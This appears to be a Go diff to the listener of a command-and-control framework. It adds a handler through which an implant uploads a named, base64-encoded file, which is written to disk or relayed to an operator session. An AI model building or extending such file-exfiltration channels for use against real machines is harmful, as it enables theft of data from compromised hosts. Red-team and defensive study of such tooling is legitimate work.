@@ -60,6 +60,7 @@ func HTTPServerHandler(w http.ResponseWriter, r *http.Request) {
 // FileName - a string value provided by an implant that is the filename for a file being sent to download.
 //
 // File - a string value that is expected to be a base64 encoded string that is a file
+
 func handleGetRequests(w http.ResponseWriter, r *http.Request) {
 
 	// Construct variables for GET URL paramaters
@@ -289,6 +290,10 @@ func handleGetRequests(w http.ResponseWriter, r *http.Request) {
 // Username - a username provided so the handler knows who the request is destined for, defaults to "server" if the implant does not specify in the request.
 //
 // Register - a boolean value that lets a listener know if an implant is attempting to register itself or not. If not provided registration is assumed to be false. If registration is attempted the listener will check for valid authentication via the PSK and attempt to register a new session.
+//
+// FileName - a string value provided by an implant that is the filename for a file being sent to download.
+//
+// File - a string value that is expected to be a base64 encoded string that is a file
 
 func handlePostRequests(w http.ResponseWriter, r *http.Request) {
 	r.ParseForm()
@@ -304,6 +309,8 @@ func handlePostRequests(w http.ResponseWriter, r *http.Request) {
 	var additionalFunctions map[string]interface{}
 	var postUsername string
 	register := false
+	var postFileName string
+	var postFile string
 	var err error
 
 	// Get the Remote Address of the Implant from the request
@@ -395,6 +402,14 @@ func handlePostRequests(w http.ResponseWriter, r *http.Request) {
 		postUsername = "server"
 	}
 
+	if len(postParams["filename"]) > 0 {
+		postFileName = postParams["filename"][0]
+	}
+
+	if len(postParams["file"]) > 0 {
+		postFile = postParams["file"][0]
+	}
+
 	if postPSK == PSK {
 
 		if register == true {
@@ -441,6 +456,23 @@ func handlePostRequests(w http.ResponseWriter, r *http.Request) {
 			currentWolf := core.Wolves[postUsername]
 			jsonData := `{"data":"` + postData + `"}`
 			core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
+		}
+	}
+
+	if postFileName != "" {
+		core.LogData("Session " + strconv.Itoa(postSessionID) + " returned the file: " + postFileName)
+
+		if postFile == "" {
+			core.LogData("Session " + strconv.Itoa(postSessionID) + " file contents was empty, no file written for: " + postFileName)
+			fmt.Println("\nSession " + strconv.Itoa(postSessionID) + " file contents was empty, no file written for: " + postFileName)
+		} else {
+			if postUsername == "server" {
+				core.DownloadFile(postFileName, postFile)
+			} else {
+				currentWolf := core.Wolves[postUsername]
+				jsonData := `{"filename":"` + postFileName + `"` + `,"file":"` + postFile + `"}`
+				core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
+			}
 		}
 	}
 
